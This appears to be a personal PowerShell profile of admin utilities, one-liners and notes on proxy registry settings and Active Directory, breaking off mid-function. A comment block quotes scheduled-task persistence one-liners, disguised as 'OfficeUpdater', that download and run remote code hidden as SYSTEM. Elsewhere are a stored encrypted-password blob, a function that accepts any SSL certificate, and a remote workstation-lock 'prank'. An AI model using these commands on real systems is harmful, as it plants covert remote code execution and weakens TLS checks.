# start-transcript. Will write session to a text file.
# Set-PSDebug -Strict

# Instead of Open-IE I use the built-in ii alias for Invoke-Item
# ii "google.com"; doesn't work. How?
# start http://google.com – orad Aug 10 '15 at 16:26

# write-host "Your modules are..." -ForegroundColor Red
# Get-module -li

filter FileSizeBelow($size) {if ($_.Length -le $size) { $_ }}
filter FileSizeAbove($size) {if ($_.Length -ge $size) { $_ }}

# $env:path += ";$profiledir\scripts"
# New-PSDrive -Name Scripts -PSProvider FileSystem -Root $profiledir\scripts

function Get-DiskSpace {
	$colItems = Get-wmiObject -class "Win32_LogicalDisk" -namespace "root\CIMV2" `
	-computername localhost
	foreach ($objItem in $colItems) {
		write $objItem.DeviceID $objItem.Description $objItem.FileSystem `
 				 ($objItem.Size / 1GB).ToString("f3") ($objItem.FreeSpace / 1GB).ToString("f3")
	}
}

#[Byte[]]$out=@(); 0..9 | %{$out += Get-Random -Minimum 0 -Maximum 255}; [System.IO.File]::WriteAllBytes("random",$out)

The PowerShell Square Function

#It's a straight forward pattern to get this working.
#1.Create a function
#2.Add the param keyword
#3.Add the [Parameter(ValueFromPipeline)] attribute to the parameter
#4.Add a Process block for your logic (here, it's just multiplying the parameter by itself)
#http://www.old.dougfinke.com/blog/index.php/2014/12/23/four-steps-to-turn-powershell-one-liners-into-pipeable-functions/
function sqr {
	param ([Parameter(ValueFromPipeline)] $p )
	Process { $p * $p }
}

# NETWORK
# get-wmiobject Win32_NetworkAdapterConfiguration | ? {$_.MacAddress} |select macaddress,description,servicename,ipaddress

#get-wmiobject Win32_UserAccount | ft Name,SID
#get-wmiobject Win32_Group | ft Name,SID

Set-ADAccountPassword [-Identity] <ADAccount> -AuthType Negotiate -Cred   -NewPassword  -OldPassword  -Reset -Server

function Where-UpdatedSince{
  Param([DateTime]$date=[DateTime]::Today, [switch]$before=$False)
	Process{ if (($_.LastWriteTime -ge $date) -xor $before) { Write-Output $_ } }
};  #set-item -path alias:wus -value Where-UpdatedSince

# [ValidateRange(1,10)][int]$xCon = 1; $xCon = 22
# [ValidateLength(1,25)][string]$sCon = ""
# $arr = "aaa","bbb","x"; $OFS='/'; "arr is [$arr]"
# Format output a la printf (see Composite Formatting  http://bit.ly/1gawf5H)
# formatString -f argumentList  https://msdn.microsoft.com/en-us/library/txafckwd.aspx
# $PSItem or $_
# $private:name  $name or $local:name  $script:name  $global:name
# Test-Path variable:name
# --% stop parsing  https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.core/about/about_parsing
# https://www.simple-talk.com/sysadmin/powershell/powershell-one-liners-variables-parameters-properties-and-objects/
#   Get-Member -InputObject object -Name propertyName
#   any |Out-GridView
# https://www.simple-talk.com/sysadmin/powershell/powershell-one-liners-variables-parameters-properties-and-objects/bit.ly/1jFESry
#   any | Select-Object @{Name = name;Expression = scriptBlock}
# $obj | Add-Member -MemberType NoteProperty -Name name -Value value
#   $obj = New-Object PSObject -Property hashTable
#   $obj | Add-Member -NotePropertyMembers hashTable
# $myinvocation.pstypenames # type hierarchy
# "hello" -is [string]  #test type
# [bool]($var -as [int] -is [int])
# [char]integer  [char]0x42
# [bool](gcm Get-ChildItem -ea SilentlyContinue)
# $newObj = $oldObj | Select-Object *  # clone object http://stackoverflow.com/a/9582907/115690
# $PSScriptRoot
#   Split-Path $script:MyInvocation.MyCommand.Path
# Import-Module path\module   Get-Command -Module module Get-Module    Get-Module -ListAvailable
#   Get-Module | Get-Member
# (gcm Get-Verb).ScriptBlock     gc function:Get-Verb     (gci function:Get-Verb).definition
#    & (gmo Test) { Get-Content function:foobar }
# Trace-Command -psHost -Name ParameterBinding { “abc”, “Abc” | select -unique }
#    function foo($a, $b) { Write-Host $PSBoundParameters }; foo “one” “two”
# Param ( [String[]]$files )
#    $IsWP = [System.Management.Automation.WildcardPattern]:: ContainsWildcardCharacters($files)
#     If ($IsWP) { $files = Get-ChildItem $files | % { $_.Name } }
#     http://stackoverflow.com/a/17334409/115690
# (Get-Command path).FileVersionInfo    (Get-Item path).VersionInfo | Format-List
# Invoke-History integer    r 23
#  Run command from history by command substring  #commandSubstring   #child (assuming you recently ran e.g. Get-ChildItem);
# $PROFILE | Format-List * -Force
# Test-Path $PROFILE.CurrentUserCurrentHost
# http://stackoverflow.com/a/21200179/115690
#   $j = Start-Job -ScriptBlock { … } if (Wait-Job $j -Timeout $seconds) { Receive-Job $j } Remove-Job -force $j
# $LastExitCode=0 but $?=False . Redirecting stderr to stdout gives NativeCommandError)
#     http://stackoverflow.com/a/12679208/115690
# any > $null  $null = any  any | Out-Null  [void] (any)
# Invoke-Expression string  iex “write-host hello”  hello
# Get-EventLog -log system –newest 1000 | where-object {$_.eventid –eq '1074'} | format-table machinename, username, timegenerated –autosize
# Get-Hotfix -id kb2862152
# Backup-GPO –all –path \AdminServerGPO-Backups
# Get-WMIobject win32_networkadapterconfiguration | where {$_.IPEnabled -eq “True”} | Select-Object pscomputername,ipaddress,defaultipgateway,ipsubnet,dnsserversearchorder,winsprimaryserver | format-Table -Auto
# Get-WMIobject –computername WS2008-DC01 win32_networkadapterconfiguration | where {$_.IPEnabled -eq “True”}| Select-Object pscomputername,ipaddress,defaultipgateway,ipsubnet,dnsserversearchorder,winsprimaryserver | format-Table –Auto
# Parse a list of system names and use Get-CIMInstance – a newer CMDlet and faster than Get-WMIObject
#  Get-CIMInstance Win32_NetworkAdapterConfiguration -Filter 'IPEnabled = true' -ComputerName (Get-Content C:SERVERLIST.TXT) | Select-Object pscomputername,ipaddress,defaultipgateway,ipsubnet,dnsserversearchorder,winsprimaryserver | Format-Table -AutoSize | out-file c:IPSettings.txt
# Get-AdDomainController -Filter * | Select hostname,isglobalcatalog | Format-table -auto
# Get-Content C:userlist.csv | foreach {Get-ADuser $_ | select distinguishedname,samaccountname} | export-csv –path c:newuserlist.csv
# What is the OS version and Service Pack level for all of my Windows systems in a certain OU?
#   Get-ADComputer -SearchScope Subtree -SearchBase “OU=PCs,DC=DOMAIN,DC=LAB” –Filter {OperatingSystem -Like “Windows*”} -Property * | Format-Table Name, OperatingSystem, OperatingSystemServicePack
#    •http://technet.microsoft.com/en-us/library/dn249523.aspx
# gci –r -force | measure -sum PSIsContainer,Length -ea 0
# ghy | select -exp commandline | ogv -outp M | iex
#   Get-History | Select-Object -ExpandProperty commandline | Out-GridView -OutputMode Multiple | Invoke-Expression
# $allusers= ( get-aduser -filter * -properties *)
# $allusers| foreach { set-aduser $_ -displayname ($_.givenname + " " + $_.sn)}
# Get-Process chrome* | Select-Object processname,ID,CPU | sort CPU
# $ListOfProcessObjects | Where-Object { $_.processname -match "chrome" } | select-object processname,VM | sort VM
# $SystemLogs = Get-EventLog System
# $SystemLogs | Where-Object {$_.entrytype -match "error" } | select-object message,entrytype | sort message | more
# $SystemLogs | Where-Object {$_.entrytype -match "error" } | select-object message| sort message | more | Get-Unique -asstring | more
# Enter-PsSession myserver
# Exit-PsSession
# Invoke-Command -computername myserver1, myserver2, myserver3 {get-Process}
# Invoke-Command -computername myserver1,myserver2,myserver3 -filepath \scriptserver\c\scripts\script.psl
#  N010617230237 Please save this number for future reference.
# $week = (Get-Date).AddDays(-7)
# $domain = (get-addomain).name
# [DateTime]::Now.ToString("yyyyMMdd")     [DateTime]::Now.ToString("yyyy-MM-ddTHH:mm:ss")
# $array = "a", "b"; write-output a b c d | select-string -pattern $array -simpleMatch
# (get-addomain).name
# $computer = "."; ([WMICLASS]"\$computer\root\CIMv2:win32_process").Create("notepad.exe")
# [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Web") ; [System.Web.Security.Membership]::GeneratePassword(10,5)
# if ($variable -is [object]) {}
# [System.net.Dns]::GetHostEntry('APINSSWN08.txdcs.teamibm.com')
# & { trap {continue}; [System.net.Dns]::GetHostAddresses($env:computername) }
# psexec \machine /s cmd /c "echo. | powershell . get-eventlog -newest 5 -logname application | select message"
# cls;while($true){get-date;$t = New-Object Net.Sockets.TcpClient;try {$t.connect("168.44.245.11",3389);write-host "R...
# cls;$idxA = (get-eventlog -LogName Application -Newest 1).Index;while($true){$idxA2 = (Get-EventLog -LogName Application -newest 1).index;get-eventlog -logname Application -newest ($idxA2 - $idxA) |  sort index;$idxA = $idxA2;sleep 10}


# $p = Read-Host -AsSecureString
# $p | ConvertFrom-SecureString
#$UserName = "yourdomain\username"  #Elevated account name
#$Password = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000862959a992b18048b1b3f9973ceda084000000000200000000001066000000010000200000005c5878082b7f6920ad5816116040b6e6d682b83e5a08a9030f25a9e3526a7281000000000e8000000002000020000000d54d17d6724166100acc2c15de430717984b3e53c8ae3e58e75e4bd257ef52313000000032c9fc963f2b987085b4a77b0c8f2b1180a125ccd2fedf869ff57aa86eb767ecea5d55fcb541178338419dc8b925b9d7400000004d5d40666212b0f5c13303caac80e3dd5973e9f82ca8345c51a9760f77858d95a1259a786625faa97cf1ac292eee9459cddd87446191824ec5d142f6226c3ae0" | ConvertTo-SecureString
#Store all of this in a format that PowerShell can use.
#$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $P

# $Epoch = New-Object -Type DateTime -ArgumentList 1970, 1, 1, 0, 0, 0, 0
# $Epoch.AddSeconds(("1412750187"))
# ((get-date) - $epoch).totalseconds
# ($x=new-object xml).Load("http://rss.slashdot.org/Slashdot/slashdot");$x.RDF.item|?{$_.creator-ne"kdawson"}|fl descr*
#     slashdot reader sans the horrible submissions by mr. kdawson. Designed to be fewer than 120 chars which allows it to be used as signature on /.

# gps | select ProcessName -exp Modules -ea 0 | where {$_.modulename -match 'msvc'} | sort ModuleName | Format-Table ProcessName -GroupBy ModuleName


Invoke-WebRequest fails disabled  
DisableFirstRunCustomize DWORD value greater than 0 under one of these keys:
    "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Internet Explorer\Main",
    "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Main",
    "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main",
    "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main"
  Get-ItemProperty "HKcu:\Software\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize
  Get-ItemProperty "HKlm:\Software\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize
  Get-ItemProperty "HKCU:\Software\Policies\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize
  Get-ItemProperty "HKlm:\Software\Policies\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize

  Get-ItemProperty "HKcu:\Software\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize
  Get-ItemProperty "HKlm:\Software\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize
  Get-ItemProperty "HKCU:\Software\Policies\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize
  Get-ItemProperty "HKlm:\Software\Policies\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize

  Set-ItemProperty "HKcu:\Software\Policies\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize -value 1 
  Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize -value 1 
  Set-ItemProperty "HKcu:\Software\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize -value 1 
  Set-ItemProperty "HKLM:\Software\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize -value 1 

  Following work in reg add:
  reg add "HKLM\Software\Policies\Microsoft\Internet Explorer\Main" /v DisableFirstRunCustomize /d 1 /f /t reg_dword
  reg add "HKcu\Software\Microsoft\Internet Explorer\Main"          /v DisableFirstRunCustomize /d 1 /f /t reg_dword

  reg query "HKLM\SOFTWARE\Microsoft\Internet Explorer\SearchURL" /s
  req query "HKCU\SOFTWARE\Microsoft\Internet Explorer\SearchURL" /s
  Internet Explorer Atos proxy for Internet Explorer http://proxyconf.my-it-solutions.net/proxy-na.pac
  HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings
  AutoDetect = 1 (DWord value) - enables Automatically detect....
  HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings AutoDetect 0 (DWord) -disables Automatically detect....

  reg query  "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoDetect
  reg query  "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | findstr /i auto
  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoDetect /d 1 /f /t REG_DWORD
  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL /d http://proxyconf.my-it-solutions.net/proxy-na.pac /f /t REG_SZ
  $url = (get-itemproperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings").'AutoConfigURL'

  Function Set-InternetProxy {
    [CmdletBinding()]
    param(
      #[Parameter(ValidateSet='Enable','On','Disable','Off')][string]$State,
      [string]$State,
      [string]$Url,
      [Alias('On' )][switch]$Enable,
      [Alias('Off')][switch]$Disable 
    )
    If ($State -match '^(On|Ena)') { $Enable  = $True  }
    If ($State -match '^(Of|Dis)') { $Disable = $True }
    $InternetSettingsKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
    $AutoConfigURL       = 'AutoConfigURL'
    $AutoConfigURLSave   = $AutoConfigURL + 'SAVE'
    $AutoDetect          = 'AutoDetect'
    $ProxyEnable         = 'ProxyEnable'
    $ProxyValues         = 'AutoConfig ProxyEnable Autodetect'
    $urlEnvironment      = $Env:AutoConfigUrl 
    $urlCurrent          = (get-itemproperty $InternetSettingsKey $AutoConfigURL     -ea 0).$AutoConfigURL      
    $urlSaved            = (get-itemproperty $InternetSettingsKey $AutoConfigURLSave -ea 0).$AutoConfigURLSAVE 
    $urlDefault          = 'http://proxyconf.my-it-solutions.net/proxy-na.pac'
    If ($Enable -eq $Disable) {
      Write-Warning "Must specify either Enable or Disable (alias: On or Off)"
    } elseif ($Disable) {
      if ($urlCurrent) {
        set-itemproperty $InternetSettingsKey $AutoConfigURLSave $urlCurrent -force -ea 0
        remove-itemproperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" 'AutoConfigURL' -ea 0
      }
      Set-ItemProperty $InternetSettingsKey $AutoDetect  0 -force -ea 0
      Set-ItemProperty $InternetSettingsKey $ProxyEnable 0 -force -ea 0
    } elseif ($Enable) {
      $Url = switch ($True) {
        { [boolean]$Url            } { $Url            ; break }
        { [boolean]$UrlEnvironment } { $UrlEnvironment ; break }
        { [boolean]$UrlCurrent     } { $UrlCurrent     ; break }  
        { [boolean]$urlSaved       } { $UrlSaved       ; break } 
        { [boolean]$urlDefault     } { $UrlDefault     ; break }
        Default { 
          Write-Warning "Supply URL for enabling and setting AutoConfigURL Proxy"
          return
        }
      }
      Set-Itemproperty $InternetSettingsKey $AutoConfigURL $url -force -ea 0
      Set-ItemProperty $InternetSettingsKey $AutoDetect    1    -force -ea 0    
      Set-ItemProperty $InternetSettingsKey $ProxyEnable   1    -force -ea 0
    }
    $Settings = get-itemproperty $InternetSettingsKey -ea 0 | findstr /i $ProxyValues | sort
    ForEach ($Line in $Settings) {
      Write-Verbose $Line
    }
  } 
function t  { param([ValidateSet('a','b','c')]$abc) $v = get-variable abc; $v | fl * -force; $v | select -expand Attributes| fl * -force }



###  Report-478 397 tools
###  Fix Convert-Bigfix 2 output files?
###  Tools for AD RepAdmin NTFRSUtl NTDSUtil DNS DNSCmd nslookup
###  get-first -skip      # get-last -except -allbut
### Remove-blank Split-Text -pattern  -remove -every -skip -skiplast -until -skipuntil
### netdom, netstat, nbtstat 

  reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"  |findstr /i auto

  reg add    "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL-SAVE /d http://proxyconf.my-it-solutions.net/proxy-na.pac /f /t REG_SZ
  reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL /f 
  # Removes it correctly but doesn't seem to update explorer "checkbox"
  Setting AutoDetect to 0 OR 1 doesn't seem to matter
  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"  /v AutoDetect /d 0 /f /t REG_DWORD

  registry key "internet explorer" "local area connection" "use automatic configuration script"

  reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"  |findstr /i auto
  reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"  |findstr /i auto

  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\comdlg32\Placesbar
  http://www.howtogeek.com/97824/how-to-customize-the-file-opensave-dialog-box-in-windows/

  Subst K: C:\Users\A469526\documents\tools
  https://code.google.com/p/psubst/#Inconstancy

  REGEDIT4
  [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices]
  "Z:"="\??\C:\Documents\All Users\Tools"

  [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
  "K Drive"="subst K: C:\Users\A469526\documents\tools
  "L Drive"="subst L: G:\Tools"
  "M Drive"="subst M: F:\Tools"
  #>



<#
http://blog.cobaltstrike.com/2013/11/09/schtasks-persistence-with-powershell-one-liners/
#(X86) - On User Login
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
#(X86) - On System Start
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System
#(X86) - On User Idle (30mins)
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
#(X64) - On User Login
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
#(X64) - On System Start
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System
#(X64) - On User Idle (30mins)
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
Each of these one liners assumes a 32-bit PAYLOAD.
#>


function get-xpn ($text) { # Get an XPath Navigator object based on the input string containing xml
	$rdr = [System.IO.StringReader] $text
	$trdr = [system.io.textreader]$rdr
	$xpdoc = [System.XML.XPath.XPathDocument] $trdr
	$xpdoc.CreateNavigator()
}

<#
$snapins = @(
	"Quest.ActiveRoles.ADManagement",
	"PowerGadgets",
	"VMware.VimAutomation.Core",
	"NetCmdlets"
)
$snapins | ForEach-Object {
  if (Get-PSSnapin -Registered $_ -ErrorAction SilentlyContinue) { Add-PSSnapin $_ }
}
#>

##############################################################################
## Search the PowerShell help documentation for a given Regex
##  Get-HelpMatch hashtable
##  Get-HelpMatch "(datetime|ticks)"
function apropos {
	param($searchWord = $(throw "Please specify content to search for"))
	$helpNames = $(get-help *)
	foreach($helpTopic in $helpNames)	{
	  $content = get-help -Full $helpTopic.Name | out-string
	  if($content -match $searchWord) {
			 $helpTopic | select Name,Synopsis
	  }
	}
}


# Raoul Supercopter  http://stackoverflow.com/questions/138144/what-s-in-your-powershell-profile-ps1-file
function count {
    BEGIN { $x = 0 }
    PROCESS { $x += 1 }
    END { $x }
}

function product {
	BEGIN { $x = 1 }
	PROCESS { $x *= $_ }
	END { $x }
}

function sum {
	BEGIN { $x = 0 }
	PROCESS { $x += $_ }
	END { $x }
}

function average {
	BEGIN { $max = 0; $curr = 0 }
	PROCESS { $max += $_; $curr += 1 }
	END { $max / $curr }
}


function Get-Time { return $(get-date | foreach { $_.ToLongTimeString() } ) }
function promptXXX {
	# Write the time
	write-host "[" -noNewLine
	write-host $(Get-Time) -foreground yellow -noNewLine
	write-host "] " -noNewLine
	# Write the path
	write-host $($(Get-Location).Path.replace($home,"~").replace("\","/")) -foreground green -noNewLine
	write-host $(if ($nestedpromptlevel -ge 1) { '>>' }) -noNewLine
	return "> "
}


function LL { # LS.MSH  Colorized LS function replacement # http://mow001.blogspot.com
	param ($dir = ".", $all = $false)
	$origFg = $host.ui.rawui.foregroundColor
	if ( $all ) { $toList = ls -force $dir }
	else { $toList = ls $dir }
	foreach ($Item in $toList) {
		Switch ($Item.Extension) {
			".Exe" {$host.ui.rawui.foregroundColor = "Yellow"}
			".cmd" {$host.ui.rawui.foregroundColor = "Red"}
			".msh" {$host.ui.rawui.foregroundColor = "Red"}
			".vbs" {$host.ui.rawui.foregroundColor = "Red"}
			Default {$host.ui.rawui.foregroundColor = $origFg}
		}
		if ($item.Mode.StartsWith("d")) {$host.ui.rawui.foregroundColor = "Green"}
		$item
	}
	$host.ui.rawui.foregroundColor = $origFg
}

function lla { param ($dir=".") ll $dir $true}
function la { ls -force }

# behave like a grep command but work on objects, used to be still be allowed to use grep
filter match  ($reg) { if ($_.tostring() -match $reg) { $_ } }
# behave like a grep -v command but work on objects
filter exclude($reg) { if (-not ($_.tostring() -match $reg)) { $_ } }
filter like  ($glob) { if ($_.toString() -like $glob) { $_ } }  # behave like match but use only -like
filter unlike($glob) { if (-not ($_.tostring() -like $glob)) { $_ } }
############################################################

### Load function / filter definition library
Get-ChildItem scripts:\lib-*.ps1 | % { . $_ write-host "Loading library file:`t$($_.name)" }

#   http://stackoverflow.com/questions/138144/what-s-in-your-powershell-profile-ps1-file

<#
# 32-bit only
# Exposes the environment vars in a batch and sets them in this PS session
function Get-Batchfile($file) {
	$theCmd = "`"$file`" & set"
	cmd /c $theCmd | Foreach-Object {
		$thePath, $theValue = $_.split('=')
		Set-Item -path env:$thePath -value $theValue
	}
}


# Sets the VS variables for this PS session to use
function VsVars32($version = "9.0") {
	$theKey           = "HKLM:SOFTWARE\Microsoft\VisualStudio\" + $version
	$theVsKey         = get-ItemProperty $theKey
	$theVsInstallPath = [System.IO.Path]::GetDirectoryName($theVsKey.InstallDir)
	$theVsToolsDir    = [System.IO.Path]::GetDirectoryName($theVsInstallPath)
	$theVsToolsDir    = [System.IO.Path]::Combine($theVsToolsDir, "Tools")
	$theBatchFile     = [System.IO.Path]::Combine($theVsToolsDir, "vsvars32.bat")
	Get-Batchfile $theBatchFile
	[System.Console]::Title = "Visual Studio " + $version + " Windows Powershell"
}
#>

#   http://stackoverflow.com/questions/138144/what-s-in-your-powershell-profile-ps1-file


#==============================================================================
# Jared Parsons PowerShell Profile (jaredp@rantpack.org)
$global:Jsh = new-object psobject  # Common Variables Start
$Jsh | add-member NoteProperty "ScriptPath" $(split-path -parent $MyInvocation.MyCommand.Definition)
$Jsh | add-member NoteProperty "ConfigPath" $(split-path -parent $Jsh.ScriptPath)
$Jsh | add-member NoteProperty "UtilsRawPath" $(join-path $Jsh.ConfigPath "Utils")
$Jsh | add-member NoteProperty "UtilsPath" $(join-path $Jsh.UtilsRawPath $env:PROCESSOR_ARCHITECTURE)
$Jsh | add-member NoteProperty "GoMap" @{}
$Jsh | add-member NoteProperty "ScriptMap" @{}

function Jsh.Load-Snapin([string]$name) { # Load snapin's if they are available
	$list = @( get-pssnapin | ? { $_.Name -eq $name })
	if ( $list.Length -gt 0 ) { return; }
	$snapin = get-pssnapin -registered | ? { $_.Name -eq $name }
	if ( $snapin -ne $null ) { 			add-pssnapin $name 	}
}
#==============================================================================


function Search-MSDNWin32 {  # msdn search for win32 APIs.
	$url = 'http://search.msdn.microsoft.com/?query=';
	$url += $args[0];
	for ($i = 1; $i -lt $args.count; $i++) {
		$url += '+';
		$url += $args[$i];
	}
	$url += '&locale=en-us&refinement=86&ac=3';
	Open-IE($url);
}

function Open-IE ($url) {    # Open Internet Explorer given the url.
	$ie = new-object -comobject internetexplorer.application;
	$ie.Navigate($url);
	$ie.Visible = $true;
}


#==============================================================================
# Christopher Douglas
function Explore {      # explorer command
  param (
		[Parameter(Position=0, ValueFromPipeline=$true, Mandatory=$true, HelpMessage="This is the path to explore...")]
		  [ValidateNotNullOrEmpty()] [string] $Target
	)
	$exploriation = New-Object -ComObject shell.application
	$exploriation.Explore($Target)
}

Function RDP {
  param (
		[Parameter(Position=0, ValueFromPipeline=$true, Mandatory=$true, HelpMessage="Server Friendly name")]
		  [ValidateNotNullOrEmpty()] [string]$server
	)
	cmdkey /generic:TERMSRV/$server /user:$UserName /pass:($Password.GetNetworkCredential().Password)
	mstsc /v:$Server /f /admin
	Wait-Event -Timeout 5
	cmdkey /Delete:TERMSRV/$server
}


function New-Explorer { #CLI prompt for password & restart explorer as $UserName
  taskkill /f /IM Explorer.exe   ######################### Problem if RDP
  runas /noprofile /netonly /user:$UserName explorer
}

Function Lock-RemoteWorkstationXXXXXX {   This is just because its funny.  PRANK
	param(
		$Computername,
		$Credential
	)
	if (!(get-module taskscheduler)) {Import-Module TaskScheduler}
	New-task -ComputerName $Computername -credential:$Credential |
	Add-TaskTrigger -In (New-TimeSpan -Seconds 30) |
	Add-TaskAction -Script {
		$signature = "[DllImport("user32.dll", SetLastError = true)] public static extern bool LockWorkStation();"
    $LockWorkStation = Add-Type -memberDefinition $signature -name "Win32LockWorkStation" -namespace Win32Functions -passthru
    $LockWorkStation::LockWorkStation() | Out-Null
  } | Register-ScheduledTask TestTask -ComputerName $Computername -credential:$Credential
}

Function llm { #lock Local machine lock computer
  $signature = "[DllImport("user32.dll", SetLastError = true)] public static extern bool LockWorkStation();"
	$LockWorkStation = Add-Type -memberDefinition $signature -name "Win32LockWorkStation" -namespace Win32Functions -passthru
	$LockWorkStation::LockWorkStation()|Out-Null
}


#==============================================================================
<#
1.List most recent version of files

ls -r -fi *.lis | sort @{expression={$_.Name}}, @{expression={$_.LastWriteTime};Descending=$true} | select Directory, Name, lastwritetime | Group-Object Name | %{$_.Group | Select -first 1}


2.gps programThatIsAnnoyingMe | kill


3.Open a file with its registered program (like start e.g start foo.xls)

ii foo.xls


4.Retrieves and displays the paths to the system's Special Folder's

[enum]::getvalues([system.environment+specialfolder]) | foreach {"$_ maps to " + [system.Environment]::GetFolderPath($_)}


5.Copy Environment value to clipboard (so now u know how to use clipboard!)

$env:appdata | % { [windows.forms.clipboard]::SetText($input) }
OR
ls | clip
#>

#==============================================================================
<#
•List all type accelerators (requires PSCX): [accelerators]::get
•Convert a string representation of XML to actual XML: [xml]"<root><a>...</a></root>"
•Dump an object (increase depth for more detail): $PWD | ConvertTo-Json -Depth 2
•Recall command from history by substring (looking up earlier 'cd' cmd): #cd
•Access C# enum value: [System.Text.RegularExpressions.RegexOptions]::Singleline
•Generate bar chart (requires Jeff Hicks' cmdlet): ls . | select name,length | Out-ConsoleGraph -prop length -grid
•Part 1: Help, Syntax, Display and Files
•Part 2: Variables, Parameters, Properties, and Objects
•Part 3: Collections and Hash Tables
•Part 4: Files and Data Streams
http://www.simple-talk.com/sysadmin/powershell/powershell-one-liners-help,-syntax,-display-and--files/
http://www.simple-talk.com/sysadmin/powershell/powershell-one-liners-variables,-parameters,-properties,-and-objects/
http://www.simple-talk.com/sysadmin/powershell/powershell-one-liners--collections,-hashtables,-arrays-and-strings/
http://www.simple-talk.com/sysadmin/powershell/powershell-one-liners--accessing,-handling-and-writing-data-/
#>

function get-uptime {
	$PCounter = "System.Diagnostics.PerformanceCounter"
	$counter = new-object $PCounter System,"System Up Time"
	$value = $counter.NextValue()
	$uptime = [System.TimeSpan]::FromSeconds($counter.NextValue())
	"Uptime: $uptime"
  "System Boot: " + ((get-date) - $uptime)
}
get-winevent -listprovider microsoft-windows* | % {$_.Name} | sort

#==============================================================================

#==============================================================================
# Using a target web service that requires SSL, but server is self-signed.
# Without this, we'll fail unable to establish trust relationship.
function Set-CertificateValidationCallback {
  try {
  Add-Type @'
  using System;
  public static class CertificateAcceptor{
    public static void SetAccept() {
      System.Net.ServicePointManager.ServerCertificateValidationCallback = AcceptCertificate;
    }
    private static bool AcceptCertificate (                         Object sender,
      System.Security.Cryptography.X509Certificates.X509Certificate certificate,
      System.Security.Cryptography.X509Certificates.X509Chain       chain,
      System.Net.Security.SslPolicyErrors                           policyErrors) {
        Console.WriteLine("Accepting certificate and ignoring any SSL errors.");
        return true;
    }
  }
'@
  }
  catch {} # Already exists? Find a better way to check.
  [CertificateAcceptor]::SetAccept()
}
#==============================================================================
function Get-FolderSizes {
  [cmdletBinding()]
  param(
    [parameter(mandatory=$true)]$Path,
    [parameter(mandatory=$false)]$SizeMB,
    [parameter(mandatory=$false)]$ExcludeFolder
  ) #close param
  $pathCheck = test-path $path
  if (!$pathcheck) {"Invalid path. Wants gci's -path parameter."; break}
  $fso = New-Object -ComObject scripting.filesystemobject
  $parents = Get-ChildItem $path -Force | where { $_.PSisContainer -and $_.name -ne $ExcludeFolder }
  $folders = Foreach ($folder in $parents) {
